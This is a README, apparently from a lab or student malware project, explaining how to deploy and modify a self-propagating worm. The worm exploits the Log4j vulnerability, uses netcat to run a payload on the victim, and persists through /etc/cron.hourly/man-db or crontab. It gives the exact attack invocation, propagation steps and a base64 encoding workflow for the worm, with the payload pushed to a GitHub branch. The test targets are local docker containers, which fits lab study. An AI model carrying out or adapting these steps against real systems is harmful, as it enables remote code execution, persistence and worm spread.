# How to perform the attack
## File recap
* __Master_script.sh:__ This file performs the attack itself, it exploits the log4j vulnerability and opens a netcat connection to execute the file Worm.sh in the victim's machine.
* __Worm.sh:__ This file is the worm, which has the job of storing all the necessary files in the victim's machine so that it is capable of replicating the attack. It stores a very short script in /etc/cron.hourly/man-db if it has a root user, or in crontab if the user is non-root.
* __Script_to_String_RAW.sh:__ This auxiliar file is a his script takes as input a script, and outputs the same script as a bash string removing its comments (or at least some of them) and empty lines.

## Run the containers
```
docker pull badwolf815/malware
docker pull badwolf815/malware8081
a=`docker run -d --network host 72182d512a83` ; docker exec -it $a bash
a=`docker run -d --network host 7e4895f6c652` ; docker exec -it $a bash
```

## Deploy the attack:
The containers should be already running - it might take up to 10 seconds!
```
./Master_script.sh localhost:8080 localhost:8080/login Worm.sh
```

Propagate the attack immediately (instead of waiting 1 hour for cron to do it), from container with localhost:8080 to container with localhost:8081:
```
/etc/cron.hourly/man-db
```

## How to modify the scripts
### First, update the variable inside Worm.sh that saves the Master_Script
```
./Script_to_String_RAW.sh Master_script.sh
```
Copy the output string and put it inside the variable "MASTER_SCRIPT" (overwritting it), but deleting the following content:
```
if [ $# -ne 3 ] \nthen \necho "Usage: ./Master_script.sh LOGIN_PAGE TARGET_URL SCRIPT_REMOTE_EXECUTION" \necho "Eg: ./Master_script.sh localhost:8080 localhost:8080/login test_script_touch.sh" \necho "Eg: ./Master_script.sh localhost:8080 localhost:8080/login Worm.sh" \nexit -1 \nfi \nJAVA_RMI_SERVER_LOCATION=`pwd` \n
```
**It's very important to delete this information.**
### Secondly, update the encoding of the file Worm.sh:
```
cat Worm.sh | base64 > Worm_base64
cp Worm_base64 ../../Malware_Project_aux/encoded
# push the new encoded file to this auxiliary branch: https://github.com/aviba2000/MALWARE_aux_filed
```
